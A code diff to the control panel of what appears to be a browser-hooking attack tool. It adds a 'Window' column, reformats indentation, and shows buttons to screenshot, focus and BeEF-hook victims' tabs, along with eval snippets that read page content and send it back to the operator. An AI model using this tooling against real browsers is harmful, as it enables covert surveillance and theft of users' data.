@@ -102,13 +102,15 @@ display:none;
                                     <th>
                                         ID
                                     </th>
+                                    <th>Window</th>
                                     <th>
                                         Title
                                     </th>
                                 </tr>
                                 <tr style=display:none id=tab-template>
                                     <td data-fld=id>
-                                        1
+                                    </td>
+                                    <td data-fld=windowId>
                                     </td>
                                     <td class="url">
                                         <a href=# target=_blank data-attr=href data-fld=url><i class="icon-share"></i></a>
@@ -128,9 +130,9 @@ display:none;
                                 <li><i class="icon-list"></i> choose hooked browser session</li>
                                 <li><i class="icon-refresh"></i> refresh tab list from session</li>
                                 <li><i class="icon-share"></i> launch URL in this browser</li>
-								<li><i class="icon-exclamation-sign"></i> launching this might be visible in hooked browser</li>
-								</ul>
-								<p><a class="btn btn-secondary" href="#hook-modal" data-toggle=modal>Get hook code</a></p>
+                                <li><i class="icon-exclamation-sign"></i> launching this might be visible in hooked browser</li>
+                                </ul>
+                                <p><a class="btn btn-secondary" href="#hook-modal" data-toggle=modal>Get hook code</a></p>
                                 </div>
                                 <div class="span8">
                                     <div class="tabbable">
@@ -142,10 +144,10 @@ display:none;
                                         <div id=current-tab class="tab-content">
                                             <div class="tab-pane" id="tab-commands">
                                                 <p>
-												<button id=do-focus class='btn btn-secondary' title="Set focus on this tab">Set focus <i title="Effect will be visible in hooked browser" class="icon-exclamation-sign"></i></button>
-												<button id=do-tab-screenshot title="Take a screenshot" class='btn btn-secondary'><i class="icon-picture"></i> Screenshot <i title="Effect will be visible in hooked browser" class="icon-exclamation-sign"></i></button>
-												<button id=do-hook-beef title="Attach BeEF hook to this tab (experimental)" class='btn btn-secondary'>Hook BeEF</button>
-												</p>
+                                                <button id=do-focus class='btn btn-secondary' title="Set focus on this tab">Set focus <i title="Effect will be visible in hooked browser" class="icon-exclamation-sign"></i></button>
+                                                <button id=do-tab-screenshot title="Take a screenshot" class='btn btn-secondary'><i class="icon-picture"></i> Screenshot <i title="Effect will be visible in hooked browser" class="icon-exclamation-sign"></i></button>
+                                                <button id=do-hook-beef title="Attach BeEF hook to this tab (experimental)" class='btn btn-secondary'>Hook BeEF</button>
+                                                </p>
                                                 <form action="#">
                                                     <h5>Eval</h5>
                                                     <select class="pull-right" id="eval-snippets">
@@ -770,8 +772,8 @@ d.body.appendChild(s);\n\
         }, 2000);
     }
 
-	var snippets = {};
-	snippets['xhr'] = "x = new XMLHttpRequest();\n\
+    var snippets = {};
+    snippets['xhr'] = "x = new XMLHttpRequest();\n\
 x.onreadystatechange = function() {\n\
 if (x.readyState == 4) {\n\
    __p.postMessage({cmd:'recveval', p: x.responseText});\n\
@@ -780,9 +782,9 @@ if (x.readyState == 4) {\n\
 x.open('GET','/',true);\n\
 x.send(null);\n\
 ";
-	snippets['alert'] = 'alert(/xss/);';
-	snippets['location'] = 'location;';
-	snippets['list scripts'] = 'var s = [];\n\
+    snippets['alert'] = 'alert(/xss/);';
+    snippets['location'] = 'location;';
+    snippets['list scripts'] = 'var s = [];\n\
 for (i=0;i<document.scripts.length;i++) {\n\
 s.push(document.scripts[i].src || document.scripts[i].textContent);\n\
 }\n\
@@ -868,30 +870,30 @@ x.open('GET','/manifest.json',true);\n\
 x.send(null);";
 
     $("#eval-snippets").change(function() {
-    	var val = $(this).val();
-    	if (val && snippets[val]) {
-    		$('textarea[name=eval]').val(snippets[val]);
-    	}
-	});
-	
-	for (var i in snippets) { // populate snippets
-		if (snippets.hasOwnProperty(i)) {
-			$('#eval-snippets').append($('<option>').val(i).text(i));
-		}
-	}
+        var val = $(this).val();
+        if (val && snippets[val]) {
+            $('textarea[name=eval]').val(snippets[val]);
+        }
+    });
+    
+    for (var i in snippets) { // populate snippets
+        if (snippets.hasOwnProperty(i)) {
+            $('#eval-snippets').append($('<option>').val(i).text(i));
+        }
+    }
 
     $("#eval-ext-snippets").change(function() {
-    	var val = $(this).val();
-    	if (val && ext_snippets[val]) {
-    		$('textarea[name=eval-ext]').val(ext_snippets[val]);
-    	}
-	});
-	
-	for (var i in ext_snippets) { // populate snippets
-		if (ext_snippets.hasOwnProperty(i)) {
-			$('#eval-ext-snippets').append($('<option>').val(i).text(i));
-		}
-	}
+        var val = $(this).val();
+        if (val && ext_snippets[val]) {
+            $('textarea[name=eval-ext]').val(ext_snippets[val]);
+        }
+    });
+    
+    for (var i in ext_snippets) { // populate snippets
+        if (ext_snippets.hasOwnProperty(i)) {
+            $('#eval-ext-snippets').append($('<option>').val(i).text(i));
+        }
+    }
     // start with saved data
     refreshTabsTable(hookStorage.getTabs(hook));
     al("Refreshed state from local storage");
